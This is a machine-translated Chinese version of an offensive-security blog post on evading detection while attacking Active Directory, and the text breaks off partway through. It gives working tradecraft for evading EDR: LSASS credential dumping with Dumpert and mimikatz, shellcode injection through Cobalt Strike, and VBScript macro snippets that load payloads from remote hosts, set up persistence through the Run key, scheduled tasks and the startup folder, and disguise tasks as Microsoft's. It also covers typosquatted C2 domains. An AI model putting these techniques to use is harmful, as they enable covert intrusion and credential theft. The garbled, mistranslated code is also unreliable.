<html>
<head>
<title>Anti-detection protection in Active Directory.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">活动目录中的反检测保护。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/anti-detection-protection-in-active-directory-83e8eae158ec?source=collection_archive---------3-----------------------#2021-09-29">https://infosecwriteups.com/anti-detection-protection-in-active-directory-83e8eae158ec?source=collection_archive---------3-----------------------#2021-09-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="bba0" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">攻击域名时躲避检测</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/301747f275dc086be7d671d7f02bb05a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zfobmB4V6skUaUDKsLsugg.jpeg"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">unsplash.com</figcaption></figure><p id="1a87" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">如你所知，任何攻击都是分几个阶段进行的。我们成功地进行了侦察，增加了我们自己的特权，想去哪里就去哪里，最后成功地接管了整个网络。但问题来了:我们被发现了，断网了，被抓了。为了避免事件的这种发展，是时候考虑防止被发现的方法了。</p><p id="7ef2" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">警告<br/>所有信息仅供参考。编辑委员会和作者都不对本文材料可能造成的任何伤害负责。</p><p id="2c38" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">躲避记忆扫描仪<br/>系统中的任何行为都会以这样或那样的方式被记录下来，对于有经验的观察者来说，完全隐藏是不可能的。但是你可以尽量伪装自己。大多数红队或Pentesters使用PowerShell攻击一个域。此外，它变得如此受欢迎，以至于出现了整个框架，例如，Empire和PowerSploit。此外，PowerShell脚本可以使用相同的调用模糊处理进行模糊处理。为了应对所有这些工具，防御方开发了检测它们的方法，例如检测奇怪的父子关系、可疑的命令行参数，甚至各种方法来消除PowerShell。</p><p id="1091" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">隐藏Windows域的最先进的工具之一是Cobalt Strike，特别是使用执行汇编模块。可以运行类似于用C #编写的PowerShell脚本的程序。比如用C #编译的get-users，它复制了PowerView包中Get-NetUser模块的功能。此示例在域控制器中查询每个帐户的SAMAccountName、UserGivenName和UserSurname属性。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lr"><img src="../Images/61b523582aa1456f8061ff2e9a0890cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1108/format:webp/0*wSSDe_awWpkeGUP-.png"/></div></figure><p id="5028" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">使用执行装配模块<br/>运行get-users，让我们看看此时在目标机器上会发生什么。这可以使用ProcMon来完成。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/9379c262934db860917514b067fa3f89.png" data-original-src="https://miro.medium.com/v2/resize:fit:618/format:webp/0*EY1eu0o0x45XG1Bx.png"/></div></figure><p id="b0e6" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">ProcMon构建的进程树<br/>powershell.exe进程包含Cobalt Strike负载，rundll32.exe进程用于下载和执行get-users。值得一提的是，powershell.exe是rundll32.exe的母公司，只是因为钴打击载荷是从PowerShell下推出的。</p><p id="cc69" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">但是Cobalt Strike负载可以在任何进程下启动，同时也可以迁移到不同的进程。此外，Cobalt Strike的一些功能被卸载到新的进程中，以确保该软件的稳定运行。加载到rundll32进程中的dll包括get用户所需的dll，比如LDAP库和Kerberos身份验证。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lt"><img src="../Images/921288f33c2715d3321a25d6e6f4bd71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/0*E-bDmp1JaJ1Hzrof.png"/></div></figure><p id="ed7e" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">rundll32中加载的DLLs】这个模块的主要优点是文件从不写到磁盘，也就是说，汇编严格在内存中执行。同时，在内存分析过程中，对CreateRemoteThread函数给予了很多关注，由于这个函数，恶意软件迁移到其他进程并加载映像。execute-assembly模块使用内置的LoadImage函数加载自定义程序集，由于该函数主要由合法进程用来加载dll，因此很难检测到正在加载程序集。</p><p id="b57c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">需要补充的是，PowerShell并不是唯一一个被防御方严密监控的合法进程。其他常见的计划和服务(如WMIC或schtasks / at)也受到严格审查。而且这些工具的功能可以在定制中重现。NET程序集。这意味着有可能使用相同的执行装配模块隐藏使用它们。</p><p id="7d8a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">躲避EDR <br/>端点检测和响应(EDR)是一种端点威胁检测和响应技术。EDR不断监测和分析可疑活动，并对此采取适当行动。由于大多数组织关注网络安全，他们忽略了终端设备上的活动。作为SOC的主要信息来源之一，EDR通过配置各种策略来帮助缩小这一差距，包括应用启动控制、宏和脚本控制、内存活动分析等。</p><p id="d9cc" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">文章中描述的所有方法可能会与避免EDR的主题重叠，但正是在这一部分，我想考虑关键软件(如mimikatz)的隐藏操作和初始负载的交付。</p><p id="17eb" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">隐藏mimikatz <br/>的工作作为一个规则，几乎所有的EDRs都检测到任何渗透测试器、reducer或入侵者攻击Windows系统的主要工具之一的使用——mimikatz。因此，在与严肃的组织打交道时，以最纯粹的形式使用这个工具没有任何意义。</p><p id="b5de" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">或者，您可以转储LSASS进程，mimikatz使用该进程来获取重要数据。但是使用ProcDump EDR也会检测到由于拦截通信良好的API调用。因此，如果您将LSASS进程从相应的API中分离出来，那么它可以被无提示地转储。这正是Dumpert工具的工作原理。使用直接系统调用和API断开连接，这个工具允许您绕过防病毒工具和EDR，对LSASS进程进行缩短的转储。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/226dd19bfbd59df79c89fe3f1316d91e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/0*TMClmgMVQImgQ5MU.png"/></div></figure><p id="c2f0" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">使用Dumpert <br/>转储LSASS，在指定转储文件后，现在可以使用mimikatz从转储中提取信息。</p><blockquote class="lv lw lx"><p id="951a" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">mimikatz # securlsa::minidump[转储路径]<br/>mimikatz # securlsa::logon passwords</p></blockquote><p id="f4b4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">这种方法可以在转储过程中防止EDR检测，但它会通过将程序文件保存到磁盘来留下可见的痕迹。如前所述，代码注入有助于避免写入磁盘。但是普通的DLL注入也会被EDR检测到，所以sRDI技术和<a class="ae mc" href="https://github.com/monoxgas/sRDI" rel="noopener ugc nofollow" target="_blank">相关的工具</a>被开发来实现它。工具本身附有对其用途和工作原理的详细描述。</p><p id="fbeb" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">有一个专门针对注射的<a class="ae mc" href="https://github.com/outflanknl/Dumpert/tree/master/Dumpert-DLL" rel="noopener ugc nofollow" target="_blank"> Dumpert </a>的DLL版本。为了转换它，我们将使用sRDI包中的<strong class="kx ir"> ConvertToShellcode.py </strong>脚本。</p><blockquote class="lv lw lx"><p id="e989" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">python 3 converttoshellcode . py Outflank-Dumpert.dll</p></blockquote><p id="e4f4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">可以使用<strong class="kx ir">s inject</strong>Cobalt Strike模块注入生成的外壳，指定流程的PID。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi md"><img src="../Images/e3a5ec555d29fabada80fd01e3acd768.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/0*Bso3eMZIBLmj36eC.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">Shinject钴击模块</figcaption></figure><p id="7d2b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">但专门针对Cobalt Strike，它自己版本的<a class="ae mc" href="https://github.com/outflanknl/Dumpert/tree/master/Dumpert-Aggressor" rel="noopener ugc nofollow" target="_blank"> Dumpert </a>是用自己的Agressor脚本语言开发的。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi me"><img src="../Images/9b4d51b1fca683b7565426ab1d96791f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1096/format:webp/0*SU5j7IGNZefTfQWG.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">钴罢工的Dumpert</figcaption></figure><p id="e3d2" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">因此，通过组合几种方法，我们可以实现从LSASS窃取凭证的隐藏工作。</p><p id="adcc" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">避免office文档宏中的父子规则<br/>在ART攻击中，传递引导加载程序或有效负载的最流行方式是Office文档中的宏。同时，宏中的漏洞利用思想保持不变，只是它们的解释变得更加复杂，也就是说，添加了混淆以绕过EDR。</p><p id="4602" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">Office宏是用VBScript编写的，VBScript支持很多有用的功能，可以提供对系统的完全访问。因此，Emotet使用序列WinWord → cmd → PowerShell，APT28组使用调用certutil的宏来解码负载。</p><p id="79bd" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">无论你如何混淆宏，上面的例子都会被EDR使用父子进程模式检测到，因为cmd、PowerShell或certutil会从WinWord进程调用，也就是说，它们会是它的子进程。</p><p id="44f0" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">但是有几种方法可以避免这种EDR模式。</p><h1 id="e4fc" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw mq jx mr jz ms ka mt kc mu kd mv mw bi translated">1.避免直接分析后代</h1><p id="48d4" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">为了防止新进程从WinWord降级，您可以使用WMI来启动它们。新流程将成为wmiprvse.exe的子流程。这可以使用下面的代码来完成。</p><blockquote class="lv lw lx"><p id="9f9e" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">set obj = GetObject(" new:c 08 AFD 90-f2a 1–11 D1–8455–00 a0c 91 f 3880 ")<br/>obj。document . APPLICATION . shell execute " APPLICATION "，Null，" FOLDER "，Null，0</p></blockquote><p id="480c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">您还可以直接在WinWord进程中下载和执行代码。为此，使用了XMLDOM。</p><blockquote class="nc"><p id="67be" class="nd ne iq bd nf ng nh ni nj nk nl lq dk translated">Set xml = CreateObject ("Microsoft。XML DOM ")<br/>XML . async = False<br/>Set xsl = XML<br/>xsl . load(" http://IP/payload . xsl ")<br/>XML . transform node xsl</p></blockquote><h1 id="da42" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw nm jx mr jz nn ka mt kc no kd mv mw bi translated">2.由于计划任务而闪避</h1><p id="38b2" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">可以使用VBScript创建计划任务。新流程将在svchost.exe启动。这也很方便，因为我们可以安排在几天或几周内执行。这可以使用下面的代码来完成，指定所需的日期。</p><blockquote class="lv lw lx"><p id="ab74" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">set service = CreateObject(" Schedule。<br/>)【服务】呼叫服务。连接<br/> Dim td: Set td = service。NewTask (0) <br/> td。registration info . Author = " Microsoft Corporation "<br/>TD . settings . startwhenavailable = True<br/>TD . settings . hidden = False<br/>Dim triggers:Set triggers = TD . triggers<br/>Dim trigger:Set trigger = triggers。create(1)<br/>Dim start time:ts = DateAdd(" s "，30，Now)<br/>start time = Year(ts)&amp;"-"&amp;Right(Month(ts)，2) &amp; "-" &amp; Right (Day (ts)，2)&amp;【T】&amp;Right(Hour(ts)，2)&amp;":&amp;Right(Minute(ts)，2)&amp;":&amp;Right(Second(ts)，2StartBoundary = startTime <br/>触发器。ID = " time triggerid "<br/>Dim Action:Set Action = TD。Actions.Create (0) <br/>动作。PATH = " PATH/FOR/APPLICATION "<br/>呼叫服务。GetFolder ("\ ")。RegisterTaskDefinition(" update task "，td，6，，，3)</p></blockquote><p id="ece5" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">唯一需要说明的是<strong class="kx ir">时间表的使用。服务</strong>对象可以给出正在加载的<strong class="kx ir">taskschd.dll</strong>的WinWord。</p><h1 id="bd16" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw mq jx mr jz ms ka mt kc mu kd mv mw bi translated">3.使用注册表</h1><p id="0cf5" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">使用下面的VBScript代码，您可以使用注册表。</p><blockquote class="lv lw lx"><p id="5d01" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">set wsh shell = CreateObject(" WScript。shell ")<br/>wshshell . regwrite " HKCU \软件\微软\ Windows \ current version \ Run \ key "，" value "，" REG_SZ "</p></blockquote><p id="e340" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">同样，您可以存储数据，在工作负载之间传输数据，并直接从宏中修改数据。</p><h1 id="17e5" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw mq jx mr jz ms ka mt kc mu kd mv mw bi translated">4.创建文件</h1><p id="c095" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">尽管如此，不写入磁盘，攻击者的能力是非常有限的。您可以将必要的数据写入磁盘上的特定路径，如下所示。</p><blockquote class="lv lw lx"><p id="0717" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">Path = CreateObject ("WScript。壳”)。SpecialFolders ("Startup") <br/>设置objFSO = CreateObject ("Scripting。FileSystemObject") <br/>设置objFile = objFSO。CreateTextFile(路径&amp; "\ SCRIPT.bat "，True) <br/> objFile。写" notepad . exe "&amp;vbCrLf<br/>objFile。关闭</p></blockquote><p id="8735" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">一旦磁盘被写入，那么您需要尽可能地屏蔽这个操作。您可以通过使用特殊的文件路径来使分析变得复杂，因为WinWord进程写入临时tmp文件并没有什么不正常的。例如，您可以沿着以下路径之一进行录制:</p><blockquote class="lv lw lx"><p id="ce5c" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">c:\ Users \<user>\ AppData \ Local \ Microsoft \ Windows \ inet cache \ Content。word \ ~ WRF { AE 7 bbf 2 f-B65D-4bf 4–9 fad-a 779 AEC 41 a 02 }。tmp <br/> C: \ Users \ &lt;用户&gt;\ AppData \ Local \ Temp \ CVR 497 f . tmp<br/>C:\ Users \&lt;用户&gt;\ AppData \ Local \ Microsoft \ Windows \ Caches \ { afbf 9 f1 a-8ee 8–4c 77-AF34-C 647 e 37 ca 0d 9 } . 1 . verx 00000000000016 . db</user></p></blockquote><p id="602f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">但是您可以更进一步，更改Office模板:</p><blockquote class="lv lw lx"><p id="779e" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">c:\ Users \<user>\ AppData \ Roaming \ Microsoft \ Templates \ normal . dotm</user></p></blockquote><h1 id="64e2" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw mq jx mr jz ms ka mt kc mu kd mv mw bi translated">5.加载数据</h1><p id="7ce5" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">VBScript可用于通过网络加载各种数据。但是，如果您使用XMLHTTP库或URLDownloadToFIleA API函数，WinWord进程将启动一个网络连接(显然不是到Microsoft站点)，该网络连接将标记有SOC的EDR。这可以通过使用Internet Explorer COM来避免。</p><blockquote class="lv lw lx"><p id="7a86" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">set ie = CreateObject(" internet explorer。<br/>)【应用】ie。导航"<a class="ae mc" href="https://pastebin.com/raw/payload" rel="noopener ugc nofollow" target="_blank">https://pastebin.com/raw/payload</a>"<br/>State = 0<br/>直到State = 4<br/>DoEvents<br/>State = ie . ready State<br/>Loop<br/>Dim payload:payload = ie。Document.Body.innerHTML</p></blockquote><p id="a456" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">使用这种方法将导致从<strong class="kx ir">svchost.exe</strong>进程调用浏览器来加载数据。</p><h1 id="605c" class="mf mg iq bd mh mi mj mk ml mm mn mo mp jw mq jx mr jz ms ka mt kc mu kd mv mw bi translated">6.嵌入宏中</h1><p id="c89c" class="pw-post-body-paragraph kv kw iq kx b ky mx jr la lb my ju ld le mz lg lh li na lk ll lm nb lo lp lq ij bi translated">也可以将负载或文件插入到宏本身甚至文档中，以便不通过网络下载。同一个Metasploit框架能够创建带有内置负载的宏。</p><blockquote class="lv lw lx"><p id="9eca" class="kv kw ly kx b ky kz jr la lb lc ju ld lz lf lg lh ma lj lk ll mb ln lo lp lq ij bi translated">MSF venom-p generic/custom PAYLOADFILE = payload _ file-a x64-platform windows-f VBA-exe</p></blockquote><p id="996e" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">但问题在于，新进程将从WinWord进程下启动。这很容易解决，但是如何解决——我们已经在上面讨论过了。</p><p id="382e" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">值得注意的是，这些技术单独使用相当适用，但如果将这些方法(或其中的一些)一起使用，被检测到的机会会更少。</p><p id="8ace" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在攻击过程中隐藏可以欺骗软件产品，但欺骗一个人要困难得多。因此，在任何攻击过程中，你都应该思考你的行动。这里有一些显而易见的提示。</p><p id="4811" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">流程渗透很常见，但是值得考虑嵌入哪些流程。毕竟，用户可以关闭一些不必要的进程，所以选择那些将提供更长有效负载生命周期的进程是值得的。这很可能会让人怀疑记事本(notepad.exe进程)正在访问远程服务器或联机。因此，有经验的攻击者更有可能渗透更新服务或浏览器，其目的解释了与网络合作的需要。</p><p id="58fe" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们已经讨论过使用PowerShell——有时它是破坏性的。所以，任何一个操作者都应该非常了解他所使用的工具，因为你甚至无法猜测一些流行框架的加载或命令使用的是PowerShell(比如Cobalt Strike中的wmi或psexec_psh)。</p><p id="7f3a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">另一个预防措施是使用类似的域名，如github.com和githab.com。这样的域名不会引起怀疑，不像奇怪的字符集(也有类似这样的:kaWEFwkfbw.com)。这种方法既用于发送网络钓鱼电子邮件，也用于组织与命令和控制服务器的通信。</p><p id="087a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">保持被劫持主机之间通信的最佳方式是使用合法的服务和程序。通过受损网络中使用的RDP或RAdmin来执行此操作要安全得多。为了收集额外的信息，您可以获取桌面的屏幕截图，以及使用安装在主机上的麦克风和摄像头(尽管这种类型的侦察需要大量的时间和精力)。</p><p id="fe56" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在任何情况下都不应该使用流行框架的公共模块(例如，MSF的local_admin_search_enum)，它们会被各种保护工具检测到。</p><p id="019d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">切勿在捕获的主机上禁用防病毒、ATP和EDR。由于这些系统中的大多数会生成断电警报，这将是一个节点或整个网络异常的明显信号。</p><p id="8a6f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">而且，如前所述，您需要收集和积累所有凭证，甚至是没有密码的用户名、来自文档、存储和邮箱的密码，并使用它们之间的相互关系。</p><p id="4a9d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">躲避数据检测<br/>高级威胁分析(ATA)是一个局域网平台，有助于保护组织免受多种现代目标计算机攻击和内部威胁。ATA使用自己的网络分析引擎来收集和验证跨多种身份验证、授权和信息收集协议(Kerberos、DNS、RPC、NTLM等)的流量。</p><p id="3bae" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">ATA通过从域控制器到ATA网关的端口镜像或直接向域控制器部署轻量级ATA网关等机制来收集这些信息</p></div></div>    
</body>
</html>